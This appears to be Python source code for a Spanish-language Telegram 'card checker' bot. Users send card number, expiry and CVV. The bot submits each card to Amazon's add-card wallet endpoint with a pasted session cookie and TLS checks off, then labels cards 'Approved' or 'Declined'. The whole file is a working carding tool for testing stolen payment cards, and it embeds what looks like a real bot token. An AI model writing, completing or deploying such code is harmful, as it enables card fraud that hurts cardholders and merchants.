import logging
import time
import httpx
import os
import re
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from fastapi import FastAPI, Request, Response
import uvicorn

# Configuración del sistema de alertas en la consola
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

# --- CABECERAS DE NAVEGACIÓN Y CONFIGURACIÓN DE TU COOKIE DE AMAZON ---
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'es-ES,es;q=0.9,en;q=0.8',
    'Origin': 'https://amazon.com',
    'Referer': 'https://amazon.com/gp/wallet',
    'Connection': 'keep-alive',
    'X-Requested-With': 'XMLHttpRequest',
    
    # ⚠️ REEMPLAZA EL TEXTO DE ABAJO Y PEGA TU COOKIE COMPLETA ENTRE LAS COMILLAS
    'Cookie': 'session-id=TU_COOKIE_COMPLETA_AQUI'
}

async def realizar_consulta_amazon(numero, mes, ano, cvv):
    # Enlace interno que procesa la adición de tarjetas en la billetera de Amazon
    url_billetera = "https://amazon.com/cpe/managepaymentmethods/ajax/addCard"
    
    # Formato exacto de los datos del formulario que requiere la plataforma
    datos_formulario = {
        "addCreditCardNumber": numero,
        "accountHolderName": "Alex Silva",  # Nombre simulado para la consulta
        "expirationMonth": mes,
        "expirationYear": ano,
        "cvv": cvv,
        "isAddCardAsDefault": "false",
        "appAction": "addCard"
    }
    
    # Conexión asíncrona enviando las cabeceras con tu cookie inyectada
    async with httpx.AsyncClient(headers=HEADERS, verify=False, timeout=12.0) as client:
        try:
            respuesta = await client.post(url_billetera, data=datos_formulario)
            codigo_estado = respuesta.status_code
            texto_html = respuesta.text.lower()
            
            if codigo_estado == 200:
                # Filtrado de respuestas del banco emisor según el código devuelto por Amazon
                if "error_invalid_cvv" in texto_html or "cvc_check_failed" in texto_html:
                    return "Approved: Tarjeta ccv Decline. (Removido: ✅)"
                elif "insufficient_funds" in texto_html or "funds" in texto_html:
                    return "Approved: Tarjeta Activa (Fondos Insuficientes)."
                elif "success" in texto_html or "card_added" in texto_html:
                    return "Approved: Tarjeta Agregada con Éxito. (Removido: ✅)"
                elif "session_expired" in texto_html or "sign-in" in texto_html:
                    return "Error: Tu cookie de Amazon ha caducado o requiere inicio de sesión manual."
                else:
                    return "Declined: Tarjeta Mala No Insistir. (Removido: ✅)"
            else:
                return f"Declined: Error de comunicación (Código: {codigo_estado})"
                
        except Exception:
            return "Error: No se pudo establecer conexión con los servidores de la pasarela."

# --- MANEJADORES DE COMANDOS DE TELEGRAM ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("👋 Envíame una tarjeta en formato: Número|Mes|Año|CVV para procesarla en Amazon.")

async def procesar_tarjeta(update: Update, context: ContextTypes.DEFAULT_TYPE):
    texto_usuario = update.message.text.strip()
    
    # Expresión regular para extraer los 4 bloques de datos de la tarjeta de forma automática
    patron_regex = re.compile(r'(\d{15,16})[\s|:/]+(\d{2})[\s|:/]+(\d{2,4})[\s|:/]+(\d{3,4})')
    match = patron_regex.search(texto_usuario)
    
    if not match:
        await update.message.reply_text("❌ Formato inválido. Envía los datos como: `Número|Mes|Año|CVV`")
        return
        
    numero, mes, ano, cvv = match.groups()
    if len(ano) == 2:
        ano = "20" + ano  # Corrige años en formato corto (ej: 28 a 2028)
        
    mensaje_espera = await update.message.reply_text("🔍 Conectando de forma segura a la pasarela...")
    
    # Llama a la función de análisis
    resultado_final = await realizar_consulta_amazon(numero, mes, ano, cvv)
    
    # Construcción visual del reporte emulando la interfaz gráfica deseada
    icono_estado = "🟩 ✅✅✅" if "Approved" in resultado_final else "🟥 ❌❌❌"
    
    reporte_formateado = (
        f"📊 <b>RESULTADOS FINALES:</b>\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <code>{numero}|{mes}|{ano}|{cvv}</code>\n"
        f"┗ {icono_estado} {resultado_final}"
    )
    
    await mensaje_espera.edit_text(reporte_formateado, parse_mode="HTML")

# --- SERVIDOR WEB FASTAPI INTEGRADO PARA CONFIGURACIÓN WEBHOOK EN RENDER ---
web_app = FastAPI()
bot_app = None

@web_app.get("/")
async def health_check():
    return {"status": "ok", "message": "Módulo de Amazon en línea"}

@web_app.post("/webhook")
async def webhook_handler(request: Request):
    global bot_app
    if bot_app:
        data = await request.json()
        update = Update.de_json(data, bot_app.bot)
        await bot_app.process_update(update)
    return Response(status_code=200)

@web_app.on_event("startup")
async def startup_event():
    global bot_app
    TOKEN = "8904800169:AAE-8y1KJpv3KWqSKDVBCtWNtKIee70SjxI"
    URL_RENDER = "https://onrender.com"
    
    bot_app = Application.builder().token(TOKEN).build()
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, procesar_tarjeta))
    
    await bot_app.initialize()
    await bot_app.start()
    await bot_app.bot.set_webhook(url=f"{URL_RENDER}/webhook", drop_pending_updates=True)
    print("🤖 Módulo Amazon Webhook configurado con éxito...")

def main():
    puerto = int(os.environ.get("PORT", 8080))
    uvicorn.run(web_app, host="0.0.0.0", port=puerto, log_level="warning")

if __name__ == '__main__':
    main()
